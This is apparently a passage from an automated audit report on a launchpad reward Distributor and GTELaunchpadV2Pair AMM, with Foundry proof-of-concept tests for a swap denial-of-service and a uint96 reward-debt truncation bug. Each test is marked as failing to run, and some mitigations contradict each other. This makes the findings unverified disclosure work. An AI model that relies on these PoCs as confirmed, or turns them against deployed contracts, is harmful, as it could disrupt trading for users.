Swaps on GTELaunchpadV2Pair can be DOSed whenever the corresponding Distributor reward pool's totalShares drops to zero while rewardsPoolActive remains 1. In this state, any swap that generates non-zero launchpad fees will revert inside Distributor.addRewards(), making the AMM pair temporarily unusable for trading until a privileged party (the launchpad) calls endRewards() to deactivate rewards accrual.

## Command to Run Test


## Proof of Concept
1. Launchpad creates a Uniswap pair (token0, token1) with launchpadFeeDistributor set to Distributor and rewardsPoolActive = 1.
2. Launchpad creates the corresponding rewards pool in Distributor via createRewardsPair(token0, token1).
3. At least one user stakes via the launchpad so that rs.totalShares > 0 for the pool keyed by token0.
4. All users eventually withdraw or are unstaked via launchpad flows that call Distributor.decreaseStake(), bringing rs.totalShares back down to 0. However, launchpad does *not* immediately call Distributor.endRewards()/endRewardsAccrual(), so GTELaunchpadV2Pair.rewardsPoolActive remains 1.
5. A trader performs a swap on the pair that results in a non-zero amount0In or amount1In. Since launchpadFeeDistributor != 0 and rewardsPoolActive > 0, _getLaunchpadFees() returns non-zero launchpad fees.
6. Inside _update(), timeElapsed > 0 and reserves are non-zero, so _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1) is called.
7. _distributeLaunchpadFees calls IDistributor(distributor).addRewards(token0, token1, fee0, fee1). Inside addRewards, rs.totalShares == 0, so it immediately reverts with NoSharesToIncentivize().
8. The revert propagates back through _update() and swap(), causing the swap to fail. All subsequent swaps that accrue launchpad fees will continue to revert until endRewardsAccrual() is called to zero out rewardsPoolActive.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allowance");
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

// Minimal factory implementing feeTo() so _mintFee() won't revert
contract MockFactory {
    address public feeToAddr; // defaults to address(0) => feeOff

    function setFeeTo(address a) external { feeToAddr = a; }
    function feeTo() external view returns (address) { return feeToAddr; }

    function createPair(address token0, address token1, address lp, address distributor) external returns (GTELaunchpadV2Pair) {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        p.initialize(token0, token1, lp, distributor);
        return p;
    }
}

contract AMMSwapDOSTest is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockFactory factory;
    MockERC20 token0;
    MockERC20 token1;
    address alice = address(0xA11CE);

    function setUp() public {
        // Deploy distributor and set launchpad to this test
        distributor = new Distributor();
        distributor.initialize(address(this));

        // Deploy tokens
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");

        // Create rewards pool keyed by token0
        distributor.createRewardsPair(address(token0), address(token1));

        // Deploy factory and pair via factory (pair.factory must be a contract with feeTo())
        factory = new MockFactory();
        pair = factory.createPair(address(token0), address(token1), address(this), address(distributor));

        // Provide initial liquidity
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);
        pair.mint(address(this)); // mints LP to launchpadLp = address(this)

        // One staker so totalShares > 0, then exit to bring totalShares back to 0
        distributor.increaseStake(address(token0), alice, 1);
        distributor.decreaseStake(address(token0), alice, 1);
        // Now: distributor pool has totalShares == 0, but pair.rewardsPoolActive is still 1
    }

    function testSwapRevertsWhenTotalSharesZeroButRewardsActive() public {
        // Trader sends some token0 into the pair
        address trader = address(0xBEEF);
        token0.mint(trader, 10 ether);
        vm.startPrank(trader);
        token0.transfer(address(pair), 10 ether);

        // Advance time so _update() takes the timeElapsed > 0 branch and tries to distribute
        vm.warp(block.timestamp + 1);

        // Expect revert from Distributor.addRewards() -> NoSharesToIncentivize
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 1 ether, trader, "");
        vm.stopPrank();
    }
}


## Suggested Mitigation
Do not attempt to distribute launchpad fees when the rewards pool has zero shares, and do not delete accrued fees or subtract them from reserves in that case. The check must happen before accruedLaunchpadFee* are cleared in _update, otherwise accounting will desync. Two safe approaches:

Option A (preferred): pre-check and keep accruing until shares exist
- Let Distributor expose a cheap view hasShares(address launchAsset) that returns rs.totalShares > 0.
- In GTELaunchpadV2Pair._update, before deleting accrued fees and before calling _distributeLaunchpadFees, compute:
  bool hasAny = IDistributor(launchpadFeeDistributor).hasShares(token0) || IDistributor(launchpadFeeDistributor).hasShares(token1);
- If hasAny is false:
  - Do not call _distributeLaunchpadFees.
  - Do not delete accrued fees.
  - Set accruedLaunchpadFee0 = totalLaunchpadFee0 and accruedLaunchpadFee1 = totalLaunchpadFee1 (so they can be flushed later once shares reappear), and do not subtract them from reserves. This mirrors the existing timeElapsed == 0 path, preserving AMM invariants.
- If hasAny is true, proceed as today: distribute, then subtract from reserves.

Option B: try/catch with state restoration on failure
- Wrap the external Distributor.addRewards() in try/catch inside _update. Only delete accruedLaunchpadFee* and subtract the fees from reserves after a successful addRewards(). If the call reverts with NoSharesToIncentivize (or any revert), set accruedLaunchpadFee* back to totalLaunchpadFee* and do not subtract from reserves.

Additionally, at the orchestration layer:
- Have the launchpad call Distributor.endRewards(pair) atomically when the last unstake reduces totalShares to zero, ensuring rewardsPoolActive is deactivated promptly. This prevents the window where swaps attempt to route fees to an inactive pool.

Note: Do not change Distributor.addRewards() to silently skip or accept rewards when totalShares == 0. With the current RewardsTracker.update() semantics, doing so would either drop pending rewards or lock them permanently in totalPendingRewards. The fix must live in the pair (pre-check/state-restore) or at the orchestrator (auto endRewards).


## [M-4]. Zero-share check in addRewards lets any swap revert via GTELaunchpadV2Pair fee path when no stakers

### Finding Severity Justification: If totalShares == 0 in Distributor while the AMM pair still has rewardsPoolActive > 0, every swap that accrues launchpad fees will revert via Distributor.addRewards() -> NoSharesToIncentivize(). This causes a denial-of-service of trading on that AMM pair until a privileged address disables accrual (endRewards). This impacts protocol availability/function, not a direct asset loss, aligning with Medium under the Code4rena rubric.
## Derived From Pattern/Invariant
AMM swaps can be permanently DOSed when Distributor.totalShares reaches zero

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The exploitability window depends on launchpad orchestration and timing (when the pair is created, when shares reach zero, when endRewards is called). The provided code shows no on-chain coupling to prevent the mismatch, but we lack the full Launchpad flow here to prove timing windows exist in all deployments.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor.addRewards reverts with NoSharesToIncentivize() whenever the target reward pool has totalShares == 0:
"if (rs.totalShares == 0) revert NoSharesToIncentivize();"

The launchpad AMM pair GTELaunchpadV2Pair automatically forwards a share of swap fees to Distributor.addRewards on every swap while launchpadFeeDistributor and rewardsPoolActive are non-zero:
"(uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
    && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));

_update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
...
function _update(..., uint112 newLaunchpadFee0, uint112 newLaunchpadFee1) private {
    ...
    if (launchpadFeeDistributor > address(0)) {
        if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
            delete accruedLaunchpadFee0;
            delete accruedLaunchpadFee1;
            _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
        }
    }
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        address _token0 = token0;
        address _token1 = token1;
        address distributor = launchpadFeeDistributor;
        if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
        if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));
        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
        ...
    }
}"

If the rewards pool exists but its totalShares has dropped to zero (e.g. all stakers have exited or bonding has completed) while rewardsPoolActive is still 1 on the pair, any swap that generates non-zero launchpad fees will cause addRewards to revert with NoSharesToIncentivize(), which propagates back and reverts the swap.

Because rewardsPoolActive is only cleared when the trusted launchpad calls Distributor.endRewards(pair), which then calls pair.endRewardsAccrual(), there is no on-chain coupling to ensure rewardsPoolActive is turned off exactly when totalShares becomes zero. In any realistic deployment, there is a window (and possibly a long one if the admin forgets) where:
- The pool has zero stakers (totalShares == 0), but
- rewardsPoolActive remains 1, so GTELaunchpadV2Pair continues to compute launchpad fees and call addRewards.

During this period, *any* user executing a swap that involves the launchpad pair and yields non-zero fees will see their transaction revert due to NoSharesToIncentivize(), effectively DOSing trading on that pair until a privileged actor manually calls endRewardsAccrual() via Distributor.endRewards().

## Impact
When a rewards pool exists but rs.totalShares == 0 while the AMM pair still has rewardsPoolActive > 0 and launchpadFeeDistributor set, any swap that accrues non-zero launchpad fees will revert via Distributor.addRewards -> NoSharesToIncentivize(). In practice, the first swap in a new block (or any _update with timeElapsed > 0) will trigger fee distribution and revert, DoSing trading on that pair until a privileged actor disables accrual (endRewards). This is an availability/DoS risk against the AMM pair.

## Command to Run Test


## Proof of Concept
Setup: A GTELaunchpadV2Pair is initialized with launchpadFeeDistributor = Distributor. A rewards pool for (token0, token1) exists in Distributor, but no one has shares (rs.totalShares == 0). On any swap that accrues fees, the pair calls distributor.addRewards(token0, token1, fee0, fee1). Since totalShares == 0, addRewards reverts with NoSharesToIncentivize(), reverting the whole swap and DoSing the pair while rewardsPoolActive > 0.
Steps:
1) Deploy Distributor; initialize with launchpad = admin. Create rewards pair for (token0, token1) but do not stake any shares, so rs.totalShares == 0.
2) Deploy GTELaunchpadV2Pair; initialize with token0, token1, launchpadLp = admin, launchpadFeeDistributor = Distributor.
3) Provide initial liquidity to the pair and mint LP to launchpadLp. Advance time by 1 second so timeElapsed > 0 on next _update.
4) Pre-transfer some token1 to the pair, then call pair.swap(small amount0Out, 0, admin, ""). The swap’s _update computes non-zero launchpad fees and calls _distributeLaunchpadFees -> Distributor.addRewards(...), which reverts with NoSharesToIncentivize().
5) The revert bubbles up to swap, DoSing trading.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function totalSupply() external view returns (uint256) { return 0; }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract AMMFeesDoSTest is Test {
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set launchpad

        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");

        // Create Distributor rewards pool for (token0, token1). No stakers => totalShares == 0
        distributor.createRewardsPair(address(token0), address(token1));

        // Deploy pair with this test as factory, and set fee distributor to Distributor
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(this), address(distributor));

        // Seed initial liquidity and mint LP to launchpadLp (this)
        token0.mint(address(this), 1_000 ether);
        token1.mint(address(this), 1_000 ether);
        token0.transfer(address(pair), 1_000 ether);
        token1.transfer(address(pair), 1_000 ether);
        pair.mint(address(this));
    }

    function testSwapRevertsDueToZeroSharesOnFeeDistribution() public {
        // Move time so _update takes the distribution path (timeElapsed > 0)
        vm.warp(block.timestamp + 1);

        // Pre-fund input; ensure fees > 0
        token1.mint(address(this), 100 ether);
        token1.transfer(address(pair), 100 ether);

        // Expect revert from Distributor.addRewards -> NoSharesToIncentivize()
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(1, 0, address(this), ""); // small amount0Out to satisfy invariants
    }
}


## Suggested Mitigation
Change Distributor.addRewards to avoid reverting when rs.totalShares == 0 and instead treat incoming fees as non-reward donations, so the AMM fee path never breaks and reserves remain consistent:
- If rs.totalShares == 0, do not call RewardsTrackerLib.addBaseRewards/addQuoteRewards. Simply pull the tokens from msg.sender (the pair) into the Distributor and do NOT increase totalPendingRewards for those assets. These tokens are then recoverable via skimExcessRewards by governance if desired.
- If rs.totalShares > 0, keep the current behavior (record pending rewards and transfer tokens).
This preserves AMM accounting (tokens are actually moved out, matching the pair’s reserve subtraction) and guarantees swaps do not revert. Optionally, expose a view function (e.g., hasActiveStakers(launchAsset)) and guard GTELaunchpadV2Pair’s distribution path to skip addRewards when there are no stakers, but the Distributor-side change alone suffices to remove the DoS while keeping reserves consistent.





 **Derived From** : Unchecked uint256→uint96 downcasts in reward debts can corrupt accounting at high scales

## [L-5]. Unchecked uint256 to uint96 downcast in reward debt can overflow and make claims revert at scale

### Finding Severity Justification: The bug is a correctness/DoS issue caused by silently truncating 256-bit accumulated rewards into uint96 for rewardDebt. It can break further claims and any settle-on-stake/unstake for the affected user by making owed amounts exceed the global totalPending, causing reverts. However, it requires astronomically large cumulative rewards (per-user accumulated rewards > 2^96-1), which is unrealistic for standard quote assets and practically infeasible without massive token supplies. No direct fund theft occurs; impact is user-level availability loss.
## Derived From Pattern/Invariant
Unchecked uint256→uint96 downcasts in reward debts can corrupt accounting at high scales

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib / Distributor.stake / unstake / claim / _decreaseTotalPending

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib stores per-user reward debts as uint96 but computes them from unbounded uint256 math, casting down without checking bounds. When totalAccRewards exceeds 2^96-1, this cast truncates high bits, breaking the relation between `totalAccRewards` and the stored debt. Subsequent claims compute an incorrect owed amount that can exceed the global totalPendingRewards guard and cause all claims to revert.

Relevant code:

```solidity
struct UserRewardData {
    uint96 shares;
    uint96 baseRewardDebt;
    uint96 quoteRewardDebt;
}

function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint96(userData.shares);
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 existingShares = uint256(userData.shares);
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}
```

If `totalAccRewards(shares, accRewardsPerShare) > type(uint96).max`, the cast to uint96 truncates the value modulo 2^96. On the next claim, `totalAccRewards` is still the full 256-bit value, but userData.baseRewardDebt has had high bits dropped. The computed owed amount becomes:

`baseAmount = totalAccBaseRewards - truncatedDebt`,

which can be much larger than the user's fair share and even larger than the total rewards ever deposited.

Distributor enforces a global cap via totalPendingRewards:

```solidity
function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}
```

So once a user’s reward debt has overflowed, any attempt to claim (or auto-claim via stake/unstake) will produce a very large baseAmount/quoteAmount that exceeds currTotal, causing `_decreaseTotalPending` to revert. This bricks claims for that user and, because update() mutates global accumulators inside the same call, can also brick the pool's quote/base reward streaming as those calls revert.

This state is only reachable at very large cumulative reward scales (totalAccRewards per user > 7.9e28), but the code does not enforce or document any such limit, and addRewards is permissionless. In systems where reward tokens have large unit sizes or very long lifetimes, or where attackers can donate arbitrarily large amounts of a pool's reward token, this bound can be exceeded.

## Impact
If totalAccRewards for a user exceeds type(uint96).max, the downcast of rewardDebt truncates high bits. From then on, any settlement touching that user (claim, stake, unstake) computes an inflated owed amount that typically exceeds totalPendingRewards and reverts via ClaimAmountExceedsTotalPendingRewards. This results in a durable, user-specific DoS: the affected user cannot claim or adjust stake without reverting. Other users and the pool as a whole are not bricked and can still accrue and claim rewards normally. If a third party later adds sufficiently large rewards, the overflowed user can successfully claim an oversized payout (misallocating donor incentives), but there is no direct theft without such donations.

## Command to Run Test


## Proof of Concept
1. Deploy Distributor, base and quote tokens; initialize and createRewardsPair(base, quote).
2. From launchpad, give user U 1 share via increaseStake(base, U, 1).
3. Choose a huge reward amount R = 2**100 (>> 2**96). Mint R base tokens to a rewarder and call addRewards(base, quote, uint128(R), 0). This sets pendingBaseRewards = R and totalPendingRewards[base] += R.
4. From launchpad, call increaseStake(base, U, 1) again:
   - update() folds R into accBaseRewardPerShare.
   - baseAmount = R is paid out to launchpad and totalPendingRewards[base] becomes 0.
   - userData.shares becomes 2.
   - userData.baseRewardDebt is set to uint96(totalAccRewards(2, accBaseRewardsPerShare)) ~= uint96(2R), which overflows and truncates to 0.
5. Now U attempts to claim:
   - totalAccBaseRewards = totalAccRewards(2, accBaseRewardsPerShare) ≈ 2R.
   - baseAmount = totalAccBaseRewards - baseRewardDebt = 2R - 0 = 2R.
   - _distributeAssets calls _decreaseTotalPending(base, 2R), but totalPendingRewards[base] is 0, so currTotal < amount and the call reverts with ClaimAmountExceedsTotalPendingRewards().
6. User U can no longer claim any rewards, and any path that attempts to settle their rewards (e.g. future stake/unstake) will also revert when hitting the global cap check.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    error InsufficientBalance();
    error InsufficientAllowance();

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (balanceOf[msg.sender] < amount) revert InsufficientBalance();
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (balanceOf[from] < amount) revert InsufficientBalance();
        uint256 allowed = allowance[from][msg.sender];
        if (allowed < amount) revert InsufficientAllowance();
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract DistributorRewardDebtOverflowTest is Test {
    Distributor dist;
    MockERC20 baseToken;
    MockERC20 quoteToken;

    address launchpad = address(0x1234);
    address user = address(0xA11CE);
    address rewarder = address(0xBEEF);

    function setUp() public {
        dist = new Distributor();
        baseToken = new MockERC20();
        quoteToken = new MockERC20();

        dist.initialize(launchpad);

        vm.prank(launchpad);
        dist.createRewardsPair(address(baseToken), address(quoteToken));

        // Give user 1 initial share
        vm.prank(launchpad);
        dist.increaseStake(address(baseToken), user, 1);
    }

    function testRewardDebtOverflowCausesClaimsToRevert() public {
        // Extremely large reward so that totalAccRewards > 2**96
        uint256 hugeReward = 2 ** 100;
        baseToken.mint(rewarder, hugeReward);
        vm.startPrank(rewarder);
        baseToken.approve(address(dist), type(uint256).max);
        dist.addRewards(address(baseToken), address(quoteToken), uint128(hugeReward), 0);
        vm.stopPrank();

        // Launchpad increases the user's stake again, which:
        //  - pays out hugeReward to launchpad
        //  - sets baseRewardDebt using a uint96 downcast (overflow)
        vm.prank(launchpad);
        dist.increaseStake(address(baseToken), user, 1);

        // Now any attempt by the user to claim will compute a massive
        // baseAmount and hit the global totalPendingRewards guard.
        vm.startPrank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        dist.claimRewards(address(baseToken));
        vm.stopPrank();
    }
}


## Suggested Mitigation
Add an explicit bounds check before casting totalAccRewards to uint96 and revert if the value exceeds the maximum representable range, rather than silently truncating:

```solidity
function _toUint96(uint256 x) internal pure returns (uint96) {
    if (x > type(uint96).max) revert RewardDebtOverflow();
    return uint96(x);
}

function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    uint256 newBaseDebt = totalAccRewards(existingShares + newShares, accBaseRewardsPerShare);
    uint256 newQuoteDebt = totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare);
    userData.baseRewardDebt = _toUint96(newBaseDebt);
    userData.quoteRewardDebt = _toUint96(newQuoteDebt);
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = _toUint96(totalAccBaseRewards);
    userData.quoteRewardDebt = _toUint96(totalAccQuoteRewards);
}
```

Alternatively, store reward debts as uint256 instead of uint96. This removes the silent truncation risk at the cost of some storage, which is likely acceptable given rewards are central to protocol correctness.


## [L-6]. uint96 rewardDebt downcasts can overflow and then make all future claims revert once rewards are large

### Finding Severity Justification: The bug is a uint256→uint96 truncation in rewardDebt that can permanently DoS future claims for affected users once cumulative per-user accrued rewards exceed 2^96−1. Impact is functional DoS (no theft) and only arises at extremely large cumulative reward totals, which are unlikely in realistic deployments. Therefore, asset loss is not direct and likelihood is very low, warranting Low severity.
## Derived From Pattern/Invariant
Unchecked uint256→uint96 downcasts in reward debts can corrupt accounting at high scales

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.claim

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib stores each user’s reward debts as uint96, but computes them from potentially large uint256 values without any range checks. Once cumulative rewards per share are large enough that totalAccRewards exceeds 2^96−1 for some user, the cast silently truncates the high bits. This causes later claim calculations to demand more tokens than totalPendingRewards holds, which makes Distributor revert all such claims.

Library code:

struct UserRewardData {
    uint96 shares;
    uint96 baseRewardDebt;
    uint96 quoteRewardDebt;
}

function stake(RewardPoolData storage self, address user, uint96 newShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares + newShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares + newShares, accQuoteRewardsPerShare));
}

function unstake(RewardPoolData storage self, address user, uint96 removeShares)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    ...
    userData.baseRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accBaseRewardsPerShare));
    userData.quoteRewardDebt = uint96(totalAccRewards(existingShares - removeShares, accQuoteRewardsPerShare));
}

function claim(RewardPoolData storage self, address user)
    internal
    returns (uint256 baseAmount, uint256 quoteAmount)
{
    UserRewardData storage userData = self.userRewards[user];
    uint256 shares = uint256(userData.shares);
    ...
    uint256 totalAccBaseRewards = totalAccRewards(shares, accBaseRewardsPerShare);
    uint256 totalAccQuoteRewards = totalAccRewards(shares, accQuoteRewardsPerShare);

    baseAmount = totalAccBaseRewards - uint128(userData.baseRewardDebt);
    quoteAmount = totalAccQuoteRewards - uint128(userData.quoteRewardDebt);

    userData.baseRewardDebt = uint96(totalAccBaseRewards);
    userData.quoteRewardDebt = uint96(totalAccQuoteRewards);
}

Because acc*RewardPerShare is unbounded (it is monotonically increased by each addRewards/update), totalAccRewards(shares, accRewardsPerShare) can exceed 2^96−1 both for base and quote rewards given enough time or large reward amounts. When that happens, the casts to uint96 truncate the upper bits, effectively storing totalAccRewards mod 2^96 as the debt.

Later, after another reward distribution, totalAccBaseRewards' ≈ totalAccBaseRewards + delta is recomputed as full 256 bits, but userData.baseRewardDebt still contains the truncated value D_trunc. The owed amount becomes:

    baseAmount = totalAccBaseRewards' - D_trunc
               = (full 256-bit cumulative) - (lower 96 bits only)
               = delta + k * 2^96, for some k ≥ 1.

That is, the user’s computed owed rewards include extra multiples of 2^96 that were discarded during the cast. Distributor then tries to pay this amount and decrement totalPendingRewards accordingly:

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}

Once totalAccRewards wraps 96 bits, baseAmount will be much larger than the actual backing in totalPendingRewards[asset], making currTotal < amount and causing all subsequent claims that touch this user’s debt to revert with ClaimAmountExceedsTotalPendingRewards. No over-withdrawal happens thanks to this guard, but the result is a permanent DoS for claims once the 96-bit debt limit is crossed.

The threshold is extremely high (~7.9e28 in token units), so this is a long-term, high-scale bug. Nevertheless, the code has no explicit cap or documentation about this limit, and a long-lived deployment on high-decimal tokens could realistically approach such cumulative reward totals.

## Impact
Once a user’s cumulative accrued rewards exceed 2^96−1, the uint96 write to baseRewardDebt/quoteRewardDebt truncates the value. From then on, any function path that settles that user’s rewards (claimRewards, increaseStake, decreaseStake) will compute an owed amount far larger than totalPendingRewards and revert with ClaimAmountExceedsTotalPendingRewards. This creates a permanent denial-of-service for that user’s future reward settlements. Other users and pools are unaffected; the issue is per-account unless storage is repaired off-chain.

## Command to Run Test


## Proof of Concept
1. Consider a pool with a single staker holding 1 share. totalShares = 1.
2. A very large reward deposit D > 2^96 is added via addRewards and update(), so totalAccRewards(1, accBaseRewardsPerShare) ≈ D.
3. The user calls claimRewards. In RewardsTrackerLib.claim:
   - totalAccBaseRewards ≈ D.
   - baseAmount = D - 0 = D.
   - userData.baseRewardDebt is set to uint96(D), which stores D mod 2^96 (discarding the high bits).
   - Distributor pays D and reduces totalPendingRewards[base] by D.
4. Later, a small additional reward D2 = 1 is added.
5. The user calls claimRewards again. Now:
   - totalAccBaseRewards' ≈ D + D2.
   - baseAmount = totalAccBaseRewards' - D_trunc,
     where D_trunc = uint96(D) = D mod 2^96.
   - Algebraically, baseAmount ≈ D2 + k * 2^96 for some k ≥ 1.
6. However, totalPendingRewards[base] only increased by D2 in step 4. Thus baseAmount > totalPendingRewards[base], causing _decreaseTotalPending to revert with ClaimAmountExceedsTotalPendingRewards.
7. From this point on, any attempt by the user (or any function interacting with their rewards) to claim base rewards will revert, locking all subsequent base rewards for that user and potentially breaking pool operations that rely on these paths.

## Proof of Code
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
